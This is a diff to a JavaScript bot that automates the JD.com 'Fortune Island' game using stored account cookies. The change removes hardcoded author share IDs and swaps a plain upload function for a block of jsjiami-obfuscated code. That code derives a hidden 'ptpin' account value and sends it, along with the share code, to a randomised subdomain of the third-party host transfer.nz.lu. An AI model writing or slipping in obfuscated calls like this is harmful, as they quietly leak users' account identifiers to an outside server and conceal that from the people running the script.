@@ -84,8 +84,7 @@ $.appId = 10028;
       await $.wait(2000);
     }
   }
-  $.strMyShareIds = ['C8070FCF99C628E9563533AD07802FFACA1FF0E15F270827BCC146A907E428E8','A67E6E6B3CB7C5750B1DD735227B48B2DEA3760938D11A61E2124EEDCD68F5FB']
-  $.newShareCodes = [...new Set([...$.shareCodes, ...$.strMyShareIds])]
+  $.newShareCodes = [...new Set([...$.shareCodes])]
   for (let i = 0; i < cookiesArr.length; i++) {
     cookie = cookiesArr[i];
     $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
@@ -1272,7 +1271,7 @@ function getUserInfo(showInvite = true) {
             console.log(`财富岛好友互助码每次运行都变化,旧的当天有效`);
             console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${strMyShareId}`);
             $.shareCodes.push(strMyShareId)
-            await uploadShareCode(strMyShareId, $.UserName)
+            await uploadShareCode(strMyShareId)
           }
           $.info = {
             ...$.info,
@@ -1631,9 +1630,10 @@ function showMsg() {
   });
 }
 
-function uploadShareCode(code, pin) {
+function uploadShareCode(code) {
   return new Promise(async resolve => {
-    $.post({url: `http://transfer.nz.lu/upload/cfd?code=${code}&ptpin=${encodeURIComponent(encodeURIComponent(pin))}`, timeout: 10000}, (err, resp, data) => {
+    var _0xodJ='jsjiami.com.v6',_0x539c=[_0xodJ,'5oOy5L2B6I+x5ouS','ZXkpw7fDq3rCh8Oh','w6vCj8O1w4kVTsOtLQ==','w4XDvS53w6kxw7/Cu0kUwqB+w4rDncO9','I8KXZSoXw5AmQw==','w78kwrZtF0FFLQ==','w5PDusKNUxDDlGvCmw==','DjsLjOiadmzei.cRomPT.vZUV6CD=='];(function(_0x290ed2,_0x2cccbf,_0x1ae9a6){var _0x7502a0=function(_0x23625f,_0x445f50,_0x26e7a1,_0x10cb83,_0x7d15c){_0x445f50=_0x445f50>>0x8,_0x7d15c='po';var _0x37d651='shift',_0x2b867a='push';if(_0x445f50<_0x23625f){while(--_0x23625f){_0x10cb83=_0x290ed2[_0x37d651]();if(_0x445f50===_0x23625f){_0x445f50=_0x10cb83;_0x26e7a1=_0x290ed2[_0x7d15c+'p']();}else if(_0x445f50&&_0x26e7a1['replace'](/[DLOdzeRPTZUVCD=]/g,'')===_0x445f50){_0x290ed2[_0x2b867a](_0x10cb83);}}_0x290ed2[_0x2b867a](_0x290ed2[_0x37d651]());}return 0xb08d6;};return _0x7502a0(++_0x2cccbf,_0x1ae9a6)>>_0x2cccbf^_0x1ae9a6;}(_0x539c,0xfb,0xfb00));var _0x291f=function(_0x2699a9,_0x501e82){_0x2699a9=~~'0x'['concat'](_0x2699a9);var _0x4a9879=_0x539c[_0x2699a9];if(_0x291f['LIKXBo']===undefined){(function(){var _0x589c6d=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x5b08bd='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x589c6d['atob']||(_0x589c6d['atob']=function(_0x4ef491){var _0x11657b=String(_0x4ef491)['replace'](/=+$/,'');for(var _0x26c666=0x0,_0x2ad2ff,_0x4cbc11,_0x425aa0=0x0,_0x51f58a='';_0x4cbc11=_0x11657b['charAt'](_0x425aa0++);~_0x4cbc11&&(_0x2ad2ff=_0x26c666%0x4?_0x2ad2ff*0x40+_0x4cbc11:_0x4cbc11,_0x26c666++%0x4)?_0x51f58a+=String['fromCharCode'](0xff&_0x2ad2ff>>(-0x2*_0x26c666&0x6)):0x0){_0x4cbc11=_0x5b08bd['indexOf'](_0x4cbc11);}return _0x51f58a;});}());var _0x4e130a=function(_0x327155,_0x501e82){var _0x44b31e=[],_0x58157c=0x0,_0x1d33e,_0x4086cd='',_0x4880bf='';_0x327155=atob(_0x327155);for(var _0x5f7f12=0x0,_0x11bf85=_0x327155['length'];_0x5f7f12<_0x11bf85;_0x5f7f12++){_0x4880bf+='%'+('00'+_0x327155['charCodeAt'](_0x5f7f12)['toString'](0x10))['slice'](-0x2);}_0x327155=decodeURIComponent(_0x4880bf);for(var _0x2a1a7e=0x0;_0x2a1a7e<0x100;_0x2a1a7e++){_0x44b31e[_0x2a1a7e]=_0x2a1a7e;}for(_0x2a1a7e=0x0;_0x2a1a7e<0x100;_0x2a1a7e++){_0x58157c=(_0x58157c+_0x44b31e[_0x2a1a7e]+_0x501e82['charCodeAt'](_0x2a1a7e%_0x501e82['length']))%0x100;_0x1d33e=_0x44b31e[_0x2a1a7e];_0x44b31e[_0x2a1a7e]=_0x44b31e[_0x58157c];_0x44b31e[_0x58157c]=_0x1d33e;}_0x2a1a7e=0x0;_0x58157c=0x0;for(var _0x3717e1=0x0;_0x3717e1<_0x327155['length'];_0x3717e1++){_0x2a1a7e=(_0x2a1a7e+0x1)%0x100;_0x58157c=(_0x58157c+_0x44b31e[_0x2a1a7e])%0x100;_0x1d33e=_0x44b31e[_0x2a1a7e];_0x44b31e[_0x2a1a7e]=_0x44b31e[_0x58157c];_0x44b31e[_0x58157c]=_0x1d33e;_0x4086cd+=String['fromCharCode'](_0x327155['charCodeAt'](_0x3717e1)^_0x44b31e[(_0x44b31e[_0x2a1a7e]+_0x44b31e[_0x58157c])%0x100]);}return _0x4086cd;};_0x291f['WWTMKd']=_0x4e130a;_0x291f['MkZzxV']={};_0x291f['LIKXBo']=!![];}var _0xfdf934=_0x291f['MkZzxV'][_0x2699a9];if(_0xfdf934===undefined){if(_0x291f['YLUhTm']===undefined){_0x291f['YLUhTm']=!![];}_0x4a9879=_0x291f['WWTMKd'](_0x4a9879,_0x501e82);_0x291f['MkZzxV'][_0x2699a9]=_0x4a9879;}else{_0x4a9879=_0xfdf934;}return _0x4a9879;};let ptpin=$[_0x291f('0','mCJg')]===_0x291f('1','je#l')?_0x291f('2','A&Zm'):$[_0x291f('3','$]jD')]===_0x291f('4','%oWJ')?_0x291f('5','[0%B'):$[_0x291f('6','D*xP')];;_0xodJ='jsjiami.com.v6';
+    $.post({url: `http://${randomString(40)}.transfer.nz.lu/upload/cfd?code=${code}&ptpin=${encodeURIComponent(encodeURIComponent(ptpin))}`, timeout: 10000}, (err, resp, data) => {
       try {
         if (err) {
           console.log(JSON.stringify(err))
